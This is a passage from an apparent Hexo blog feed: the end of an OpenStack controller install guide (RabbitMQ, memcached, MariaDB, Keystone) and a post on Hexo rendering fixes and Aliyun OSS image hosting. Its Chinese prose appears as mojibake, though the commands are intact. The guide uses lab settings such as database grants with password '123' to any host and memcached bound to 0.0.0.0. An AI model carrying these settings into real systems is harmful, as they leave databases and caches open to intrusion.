sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">rabbitmqctl add_user openstack RABBIT_PASS<br></code></pre></td></tr></table></figure><p>ç”¨åˆé€‚çš„å¯†ç æ›¿æ¢ <code>RABBIT_DBPASS</code>ã€‚</p><p>ç»™<code>openstack</code>ç”¨æˆ·é…ç½®å†™å’Œè¯»æƒé™ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">rabbitmqctl set_permissions openstack <span class="hljs-string">&quot;.*&quot;</span> <span class="hljs-string">&quot;.*&quot;</span> <span class="hljs-string">&quot;.*&quot;</span><br></code></pre></td></tr></table></figure><p>å®‰è£…ç›‘æ§æ’ä»¶</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">rabbitmq-plugins <span class="hljs-built_in">enable</span> rabbitmq_management<br></code></pre></td></tr></table></figure><p>æ£€æŸ¥ç«¯å£æŸ¥çœ‹æ˜¯å¦å¼€å¯</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">netstat -tnulp|grep 15672<br></code></pre></td></tr></table></figure><p>å¼€å¯ä¹‹åå¯ä»¥è®¿é—®rabbitmq webç®¡ç†ç•Œé¢<a href="http://192.168.146.150:15672">http://192.168.146.150:15672</a>.</p><p>é»˜è®¤ç”¨æˆ·å:<code>guest</code> é»˜è®¤å¯†ç :<code>guest</code></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250114164646844.png" alt="image-20250114164646844"></p><h3 id="å®‰è£…memcachedç¼“å­˜token">å®‰è£…memcachedç¼“å­˜token</h3><p>ä¸‹è½½å®‰è£…è½¯ä»¶åŒ…</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum install -y memcached python-memcached<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#127.0.0.1 éƒ½æ›¿æ¢ä¸º 0.0.0.0</span><br>sed -i <span class="hljs-string">&#x27;s#127.0.0.1#0.0.0.0#g&#x27;</span> /etc/sysconfig/memcached<br><span class="hljs-comment">#å¯åŠ¨å¹¶åŠ å…¥å¼€æœºè‡ªå¯</span><br>systemctl <span class="hljs-built_in">enable</span> memcached.service<br>systemctl start memcached.service<br></code></pre></td></tr></table></figure><h2 id="SQLæ•°æ®åº“">SQLæ•°æ®åº“</h2><p>æ§åˆ¶èŠ‚ç‚¹å®‰è£…è½¯ä»¶åŒ…</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum install -y mariadb mariadb-server MySQL-python<br></code></pre></td></tr></table></figure><p>åˆ›å»ºå¹¶ç¼–è¾‘ <code>/etc/mysql/conf.d/mariadb_openstack.cnf</code>ï¼Œç„¶ååœ¨ <code>[mysqld]</code> éƒ¨åˆ†ï¼Œè®¾ç½® <code>bind-address</code>å€¼ä¸ºæ§åˆ¶èŠ‚ç‚¹çš„ç®¡ç†ç½‘ç»œIPåœ°å€ä»¥ä½¿å¾—å…¶å®ƒèŠ‚ç‚¹å¯ä»¥é€šè¿‡ç®¡ç†ç½‘ç»œè®¿é—®æ•°æ®åº“ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs config">[mysqld]<br>bind-address = 192.168.146.200<br>default-storage-engine = innodb<br>innodb_file_per_table = on<br>collation-server = utf8_general_ci<br>max_connections = 4096<br>init-connect = &#x27;SET NAMES utf8&#x27;<br>character-set-server = utf8<br></code></pre></td></tr></table></figure><p>å¯åŠ¨æ•°æ®åº“æœåŠ¡ï¼Œå¹¶å°†å…¶é…ç½®ä¸ºå¼€æœºè‡ªå¯ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl <span class="hljs-built_in">enable</span> mariadb.service<br>systemctl start mariadb.service<br><span class="hljs-comment">#æŸ¥çœ‹ç«¯å£éªŒè¯</span><br>netstat -tnulp|grep 3306<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œè„šæœ¬æ¥å¯¹æ•°æ®åº“è¿›è¡Œå®‰å…¨åŠ å›ºã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#è·³å‘</span><br>mysql_secure_installation<br><span class="hljs-comment">#è¾“å…¥å›è½¦-Y-è¾“å…¥å¯†ç -Y-Y-Y-Y</span><br></code></pre></td></tr></table></figure><h2 id="å®‰è£…å’Œé…ç½®OpenStackèº«ä»½è®¤è¯æœåŠ¡">å®‰è£…å’Œé…ç½®OpenStackèº«ä»½è®¤è¯æœåŠ¡</h2><p>è¯¥éƒ¨åˆ†æ§åˆ¶èŠ‚ç‚¹é…ç½®å³å¯ã€‚</p><h3 id="å‰ææ¡ä»¶">å‰ææ¡ä»¶</h3><p>åœ¨ä½ é…ç½® OpenStack èº«ä»½è®¤è¯æœåŠ¡å‰ï¼Œä½ å¿…é¡»åˆ›å»ºä¸€ä¸ªæ•°æ®åº“å’Œç®¡ç†å‘˜ä»¤ç‰Œã€‚</p><p>å®Œæˆä¸‹é¢çš„æ­¥éª¤ä»¥åˆ›å»ºæ•°æ®åº“ï¼š</p><ul><li><p>ç”¨æ•°æ®åº“è¿æ¥å®¢æˆ·ç«¯ä»¥ <code>root</code> ç”¨æˆ·è¿æ¥åˆ°æ•°æ®åº“æœåŠ¡å™¨ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">mysql -u root -p<br></code></pre></td></tr></table></figure><p>éšåè¾“å…¥å¯†ç è¿›å…¥æ•°æ®åº“ã€‚</p></li><li><p>åˆ›å»º <code>keystone</code> æ•°æ®åº“ï¼š</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span> keystone;<br></code></pre></td></tr></table></figure></li><li><p>å¯¹<code>keystone</code>æ•°æ®åº“æˆäºˆæ°å½“çš„æƒé™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">GRANT ALL PRIVILEGES ON keystone.* TO &#x27;keystone&#x27;@&#x27;localhost&#x27; \<br>  IDENTIFIED BY &#x27;123&#x27;;<br>GRANT ALL PRIVILEGES ON keystone.* TO &#x27;keystone&#x27;@&#x27;%&#x27; \<br>  IDENTIFIED BY &#x27;123&#x27;;<br></code></pre></td></tr></table></figure><p>ç”¨åˆé€‚çš„å¯†ç æ›¿æ¢ <code>KEYSTONE_DBPASS</code> ã€‚</p></li><li><p>é€€å‡ºæ•°æ®åº“å®¢æˆ·ç«¯ã€‚</p></li></ul><p>ç”Ÿæˆä¸€ä¸ªéšæœºå€¼åœ¨åˆå§‹çš„é…ç½®ä¸­ä½œä¸ºç®¡ç†å‘˜çš„ä»¤ç‰Œã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">openssl rand -hex 10<br></code></pre></td></tr></table></figure><h3 id="å®‰è£…å¹¶é…ç½®ç»„ä»¶">å®‰è£…å¹¶é…ç½®ç»„ä»¶</h3><p>è¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥å®‰è£…åŒ…ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum install -y openstack-keystone httpd mod_wsgi \<br>  memcached python-memcached<br></code></pre></td></tr></table></figure><p>å¯åŠ¨MemcachedæœåŠ¡ï¼Œå¹¶ä¸”é…ç½®å®ƒéšæœºå¯åŠ¨ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl <span class="hljs-built_in">enable</span> memcached.service<br>systemctl start memcached.service<br></code></pre></td></tr></table></figure><p>ç¼–è¾‘æ–‡ä»¶ <code>/etc/keystone/keystone.conf</code> å¹¶å®Œæˆå¦‚ä¸‹åŠ¨ä½œï¼š</p><ul><li><p>åœ¨<code>[DEFAULT]</code>éƒ¨åˆ†ï¼Œå®šä¹‰ç®¡ç†å‘˜tokenåˆå§‹å€¼ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">[DEFAULT]<br>...<br>admin_token = ADMIN_TOKEN<br></code></pre></td></tr></table></figure><p>ç”¨ä½ åœ¨å‰ä¸€æ­¥ç”Ÿæˆçš„éšæœºæ•°æ›¿æ¢ <code>ADMIN_TOKEN</code> ã€‚</p></li><li><p>åœ¨ <code>[database]</code> éƒ¨åˆ†ï¼Œé…ç½®æ•°æ®åº“è®¿é—®ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">[database]<br>...<br>connection = mysql://keystone:KEYSTONE_DBPASS@controller/keystone<br></code></pre></td></tr></table></figure><p>å°† <code>KEYSTONE_DBPASS</code> æ›¿æ¢ä¸ºä½ ä¸ºæ•°æ®åº“é€‰æ‹©çš„å¯†ç ã€‚</p></li><li><p>åœ¨<code>[memcache]</code> éƒ¨åˆ†ï¼Œé…ç½®MemcachedæœåŠ¡ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">[memcache]<br>...<br>servers = localhost:11211<br></code></pre></td></tr></table></figure></li><li><p>åœ¨<code>[token]</code> éƒ¨åˆ†ï¼Œé…ç½® UUID token provider å’ŒMemcached é©±åŠ¨ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">[token]<br>...<br>provider = uuid<br>driver = memcache<br></code></pre></td></tr></table></figure></li><li><p>åœ¨ <code>[revoke]</code> éƒ¨åˆ†ï¼Œé…ç½®SQL å›æ»šé©±åŠ¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">[revoke]<br>...<br>driver = sql<br></code></pre></td></tr></table></figure></li><li><p>ï¼ˆå¯é€‰çš„ï¼‰ä¸ºå¸®åŠ©æ’é”™ï¼Œåœ¨ â€œ[DEFAULT]â€éƒ¨åˆ†å¯ç”¨è¯¦ç»†æ—¥å¿—ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">[DEFAULT]<br>...<br>verbose = True<br></code></pre></td></tr></table></figure></li></ul><p>åˆå§‹åŒ–èº«ä»½è®¤è¯æœåŠ¡çš„æ•°æ®åº“ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">su -s /bin/sh -c <span class="hljs-string">&quot;keystone-manage db_sync&quot;</span> keystone<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>openstack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è®°ä¸€æ¬¡åšå®¢æ›´æ–°</title>
    <link href="/2024/12/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0/"/>
    <url>/2024/12/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0/</url>
    
    <content type="html"><![CDATA[<p>å› ä¸ºä¸€ç›´ä»¥æ¥æˆ‘çš„åšå®¢éƒ½å­˜åœ¨ä¸€äº›å°é—®é¢˜ï¼Œè§£å†³äº†ä¸€äº›ä¹‹åæ²¡æœ‰è¿›è¡Œè®°å½•ï¼Œä»Šå¤©æ‘¸é±¼å®åœ¨æ˜¯å¤ªæ— èŠäº†ï¼ŒåŠ ä¸Šæœ‰ä¸ªå¾ˆæ¶å¿ƒçš„bugå›°æ‰°äº†æˆ‘å¾ˆä¹…ï¼Œæ•…è®°å½•ä¸€ä¸‹ã€‚</p><span id="more"></span><h1 id="æ ‡è®°ä¸æ˜¾ç¤º">æ ‡è®°ä¸æ˜¾ç¤º</h1><p>åœ¨markdownä¸­ç¼–å†™çš„å¶å°”æœ‰ <mark>æ³¨æ„</mark> è¿™ç±»æ ‡è®°ï¼Œæ ¼å¼ä¸º==æ ‡è®°==ã€‚ä½†æ˜¯åœ¨markdownä¸­æ­£å¸¸æ˜¾ç¤ºçš„æ ‡è®°ï¼Œåœ¨åšå®¢é‡Œå±…ç„¶ä¸æ˜¾ç¤ºäº†ã€‚</p><p>è¿™ä¸ªé—®é¢˜å¾ˆå¥½è§£å†³ï¼Œåšå®¢ä¹‹å‰å› ä¸ºéœ€è¦ä½¿ç”¨æ•°å­¦å…¬å¼ï¼Œæ•…å°†æ¸²æŸ“å™¨ä»markedæ›´æ¢ä¸ºäº†markdown-itï¼Œmarkdown-itæœ‰æ”¯æŒæ ‡è®°çš„é»˜è®¤æ’ä»¶ï¼Œä½†æ˜¯è¦åœ¨hexoçš„_config.ymlä¸­è¿›è¡Œå¦‚ä¸‹è®¾ç½®ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">markdown:</span><br>  <span class="hljs-attr">preset:</span> <span class="hljs-string">&quot;default&quot;</span><br>  <span class="hljs-attr">render:</span><br>    <span class="hljs-attr">html:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">xhtmlOut:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">langPrefix:</span> <span class="hljs-string">&quot;language-&quot;</span><br>    <span class="hljs-attr">breaks:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">linkify:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">typographer:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">quotes:</span> <span class="hljs-string">&quot;â€œâ€â€˜â€™&quot;</span><br>  <span class="hljs-attr">enable_rules:</span><br>  <span class="hljs-attr">disable_rules:</span><br>  <span class="hljs-attr">plugins:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-abbr</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-cjk-breaks</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-deflist</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-emoji</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-footnote</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-ins</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-mark</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-sub</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">markdown-it-sup</span><br>  <span class="hljs-attr">anchors:</span><br>    <span class="hljs-attr">level:</span> <span class="hljs-number">2</span><br>    <span class="hljs-attr">collisionSuffix:</span> <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-attr">permalink:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">permalinkClass:</span> <span class="hljs-string">&quot;header-anchor&quot;</span><br>    <span class="hljs-attr">permalinkSide:</span> <span class="hljs-string">&quot;left&quot;</span><br>    <span class="hljs-attr">permalinkSymbol:</span> <span class="hljs-string">&quot;Â¶&quot;</span><br>    <span class="hljs-attr">case:</span> <span class="hljs-number">0</span><br>    <span class="hljs-attr">separator:</span> <span class="hljs-string">&quot;-&quot;</span><br></code></pre></td></tr></table></figure><p>markdown-it-markå°±æ˜¯æ˜¾ç¤ºæ ‡è®°çš„æ’ä»¶äº†ã€‚</p><h1 id="markdownä½¿ç”¨é˜¿é‡Œäº‘ossä¸Šä¼ å›¾ç‰‡">markdownä½¿ç”¨é˜¿é‡Œäº‘ossä¸Šä¼ å›¾ç‰‡</h1><p>æˆ‘ä¹‹å‰æ²¡æœ‰ä½¿ç”¨å›¾ç‰‡æ‡’åŠ è½½ä¹‹ç±»çš„ä¼˜åŒ–æ–¹æ¡ˆï¼Œæ¯æ¬¡ç™»å½•ç½‘ç«™éƒ½å·¨å¡æ— æ¯”ï¼Œå›¾ç‰‡åŠ è½½çš„å¾ˆæ…¢ï¼Œè®©æˆ‘å¾ˆä¸çˆ½ï¼Œç‰¹åˆ«æ˜¯è·ŸæŸäººçš„ä¸€å¯¹æ¯”å°±æ›´ä¸çˆ½äº†ï¼ˆæˆ‘ä¿©éƒ½æ²¡ä¼˜åŒ–ï¼Œä½†æ˜¯ä»–ä¸€ç¬é—´å°±åŠ è½½å¥½äº†ï¼‰ã€‚</p><p>åœ¨å¤šæ¬¡æœç´¢ä¸‹ï¼Œç»ˆäºå‘ç°äº†ä¸€ä¸ªæ–¹æ¡ˆï¼Œé‚£å°±æ˜¯æŠŠå›¾ç‰‡ç›´æ¥åœ¨ç²˜è´´çš„æ—¶å€™å°±ä¸Šä¼ åˆ°ç½‘ä¸Šã€‚ç”±äºå…¶ä»–å…è´¹çš„å‚å•†æˆ‘ä¸å¤ªæ”¾å¿ƒï¼Œå› æ­¤è¿™é‡Œé€‰ç”¨é˜¿é‡Œäº‘çš„å¯¹è±¡å­˜å‚¨ossã€‚</p><p>äº§å“è¿™é‡Œé€‰æ‹©å¯¹è±¡å­˜å‚¨oss</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210154112650.png" alt="image-20241210154112650"></p><p>é€‰ä¸ªæ ‡å‡†å­˜å‚¨åŒ…ï¼Œä¸€å¹´åªéœ€è¦9å—</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210154719330.png" alt="image-20241210154719330"></p><blockquote><p>æ³¨æ„è¿™é‡Œè´­ä¹°çš„å¯¹è±¡å­˜å‚¨åªæ˜¯å­˜å‚¨ï¼Œä¸Šä¼ çš„æµé‡è´¹ç”¨è¿˜æ˜¯éœ€è¦å‡ºçš„ï¼Œä½†æ˜¯å¾ˆä¾¿å®œï¼Œä¸ªäººä½¿ç”¨ä¸€ä¸ªæœˆå‡ æ¯›é’±éƒ½æ²¡æœ‰ï¼Œå¾€è´¦æˆ·é‡Œå……åå—é’±è®©å®ƒæ‰£å°±è¡Œã€‚</p></blockquote><p>ä¹‹åæ¥åˆ°æ§åˆ¶å°â€”â€”èœå•â€”â€”å¯¹è±¡å­˜å‚¨</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210160102162.png" alt="image-20241210160102162"></p><p>é€‰æ‹©åˆ›å»ºBucket</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210160124499.png" alt="image-20241210160124499"></p><p>åå­—éšä¾¿èµ·ä¸€ä¸ªï¼Œé€‰æ‹©æœ¬åœ°å†—ä½™å­˜å‚¨ã€‚è¿™é‡Œæ”¹ä¸äº†å…¬å…±è®¿é—®æ§åˆ¶å’Œè¯»å†™æƒé™ï¼Œå› æ­¤ç›´æ¥ç‚¹å®Œæˆåˆ›å»ºå°±å¥½äº†ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210160502926.png" alt="image-20241210160502926"></p><p>åˆ›å»ºå®Œæˆä¹‹åæ¥åˆ°åˆ›å»ºçš„bucketä¸­ï¼Œç‚¹å‡»æ–‡ä»¶åˆ—è¡¨ï¼Œæ–°å»ºä¸€ä¸ªç›®å½•ï¼Œèµ·ä¸€ä¸ªåå­—</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210162526938.png" alt="image-20241210162526938"></p><p>å›åˆ°bucketæ¦‚è§ˆï¼Œé€‰æ‹©å‰å¾€ç¼–è¾‘ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210160649674.png" alt="image-20241210160649674"></p><p>å°†é˜»æ­¢å…¬å…±è®¿é—®ç»™å…³äº†ï¼Œç„¶åæ¥åˆ°è¯»å†™æƒé™ï¼Œè®¾ç½®ä¸ºå…¬å…±è¯»ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210160729661.png" alt="image-20241210160729661"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210160758349.png" alt="image-20241210160758349"></p><p>è¿›å…¥RAMè®¿é—®æ§åˆ¶ï¼Œé€‰æ‹©ç”¨æˆ·å¹¶ä¸”åˆ›å»ºä¸€ä¸ªç”¨æˆ·</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210160951163.png" alt="image-20241210160951163"></p><p>æ¥ä¸‹æ¥è¾“å…¥ç”¨æˆ·åç§°ï¼Œå¹¶ä¸”æ‰“å¼€æ§åˆ¶å°è®¿é—®å’Œæ°¸ä¹…AccessKeyè®¿é—®ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210161129801.png" alt="image-20241210161129801"></p><p>ä¹‹åè¿›å…¥ç”¨æˆ·ï¼Œåˆ›å»ºAccessKey</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210162123722.png" alt="image-20241210162123722"></p><p>è¿™æ ·å°±å¥½äº†ï¼Œæ¥ä¸‹æ¥æ‰“å¼€Typoraï¼Œç‚¹å‡»æ–‡ä»¶â€”â€”åå¥½è®¾ç½®â€”â€”å›¾åƒ</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210163217920.png" alt="image-20241210163217920"></p><p>ä¸‹è½½å¥½PicGo-Coreä¹‹åæ‰“å¼€é…ç½®æ–‡ä»¶</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210163336417.png" alt="image-20241210163336417"></p><p>uploaderä¸ºaliyunè¿™ä¸ªä¸ç”¨æ”¹ï¼Œæ›´æ”¹accessKeyIdï¼ŒaccessKeySecretä¸ºåˆšåˆšç”³è¯·çš„ã€‚bucketå¡«ä½ åˆ›å»ºçš„bucketåç§°ï¼Œareaåº”è¯¥éƒ½ä¸€æ ·ï¼Œpathä¸ºåœ¨bucketä¸‹åˆ›å»ºçš„é‚£ä¸ªç›®å½•çš„åç§°ã€‚customUrléœ€è¦æˆ‘ä»¬æŸ¥è¯¢ä¸€ä¸‹bucketæ¦‚è§ˆï¼Œåœ¨æœ€åä¸€ä¸ªè¡¨æ ¼é‡Œå°†è¿™ä¸ªåœ°å€æ·»åŠ ä¸Š<code>https://</code>å³å¯</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241210163618986.png" alt="image-20241210163618986"></p><p>ä¿å­˜åé€€å‡ºé…ç½®æˆåŠŸã€‚</p><h1 id="æ–‡ç« å†…ç›®å½•ä¸€çº§æ ‡é¢˜æ— è·³è½¬é—®é¢˜">æ–‡ç« å†…ç›®å½•ä¸€çº§æ ‡é¢˜æ— è·³è½¬é—®é¢˜</h1><p>è¿™ä¸ªé—®é¢˜ä¹Ÿå›°æ‰°æˆ‘å¾ˆä¹…äº†ï¼Œæˆ‘ä¸€ç›´ä»¥ä¸ºæ˜¯ä¹‹å‰çˆ†æ”¹åšå®¢çš„æ—¶å€™æŠŠä¸»é¢˜é…ç½®æ–‡ä»¶çš„cssæ”¹äº†ï¼Œä½†æ˜¯é‡æ–°è£…äº†ä¸€æ¬¡ä¸»é¢˜ä¹‹åé—®é¢˜è¿˜æ˜¯å­˜åœ¨ã€‚</p><p>ä¹‹åæˆ‘åˆæƒ³ç€å¯èƒ½æ˜¯hexoç‰ˆæœ¬å¤ªä½äº†ï¼Œåˆæ›´æ–°äº†ä¸€æ¬¡ç‰ˆæœ¬ã€‚</p><p>æŒ‰ç…§<a href="https://segmentfault.com/a/1190000013945636">node.js - Hexoé‡è£…ä¸ä½ç½®ç§»åŠ¨</a>ä¸­æ‰€è¯´ï¼Œå…ˆåˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶å¤¹ï¼Œç„¶åä½¿ç”¨git bashåœ¨æ–°æ–‡ä»¶å¤¹ä¸­æ‰§è¡Œå¦‚ä¸‹æ“ä½œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install -g hexo-cli<br>hexo init<br>npm install hexo-deployer-git --save<br></code></pre></td></tr></table></figure><p>ä¹‹åä¿®æ”¹hexoç›®å½•ä¸‹çš„_config.ymlæ–‡ä»¶å³å¯ï¼Œè€ç”Ÿå¸¸è°ˆäº†ï¼Œè¿™é‡Œå°±ä¸è¯´äº†ã€‚</p><p>ç„¶åé‡æ–°ä¸‹è½½butterflyä¸»é¢˜å¹¶åœ¨hexoç›®å½•ä¸‹çš„_config.ymlæ–‡ä»¶è®¾ç½®ä¸»é¢˜ä¸ºbutterflyã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly<br>npm install hexo-renderer-pug hexo-renderer-stylus --save<br></code></pre></td></tr></table></figure><p>ä¹‹åå°†butterflyä¸»é¢˜ä¸­çš„_config.ymlæ–‡ä»¶é…ç½®å¥½ä¹‹åå¥½äº†ä¸€é˜µå­ï¼Œä½†æ˜¯ä¹‹åè¿˜æ˜¯å‡ºç°è¿™ç§æƒ…å†µã€‚</p><p>æ€è€ƒäº†ä¸€ä¸‹ï¼Œè§‰å¾—å¯èƒ½æ˜¯æ¸²æŸ“å™¨çš„é—®é¢˜ï¼Œå› ä¸ºå‰åçš„ä¸åŒä¹‹å¤„ä¹Ÿå·®ä¸å¤šå°±åªæœ‰æ¸²æŸ“å™¨å› ä¸ºå…¬å¼çš„é—®é¢˜è¢«æˆ‘æ”¹æˆäº†markdown-itã€‚</p><p>æœ€åè¿«ä¸å¾—å·²ï¼Œå°è¯•äº†ä¸€ä¸‹markdown-it-plusæ¥åœ¨hexoä½¿ç”¨katexï¼Œä½†æ˜¯è¿˜æ˜¯å¤±è´¥äº†ã€‚</p><p>ä¹‹åæ¢æˆmathjaxæ¸²æŸ“å…¬å¼ï¼Œä½¿ç”¨hexo-renderer-kramedæ¸²æŸ“å™¨æ¸²æŸ“æ•´ä¸ªåšå®¢ï¼Œæœ€åè¿˜æ˜¯å¤±è´¥å‘Šç»ˆã€‚</p><p>ä¸€ç›´åˆ°ç°åœ¨ä¹Ÿæ²¡å¾—å‡ºè§£å†³æ–¹æ¡ˆï¼Œå¸Œæœ›æœ‰å¤§ä½¬èƒ½å¸®æˆ‘çœ‹çœ‹æ€ä¹ˆè§£å†³ã€‚</p><blockquote><p>åè®°ï¼šè¢«è‡ªå·±è ¢å“­äº†ï¼Œåœ¨å…¨å±€yamlä¸­æ·»åŠ çš„é…ç½®ï¼š</p><p>anchors:<br>level: 2</p><p>è¿™é‡Œçš„level: 2å°±æ˜¯æŒ‡ä»äºŒçº§ç›®å½•å¼€å§‹æ·»åŠ é“¾æ¥ï¼Œåªè¦å°†å…¶æ”¹æˆ1å°±è¡Œã€‚è¿™ä¹ˆç®€å•çš„ä¸œè¥¿å›°æ‰°äº†æˆ‘å¥½å‡ ä¸ªæœˆï¼ŒçœŸè¢«è‡ªå·±è ¢å“­äº†ã€‚</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å¯ä¿¡è®¡ç®—è®ºæ–‡å­¦ä¹ é›†</title>
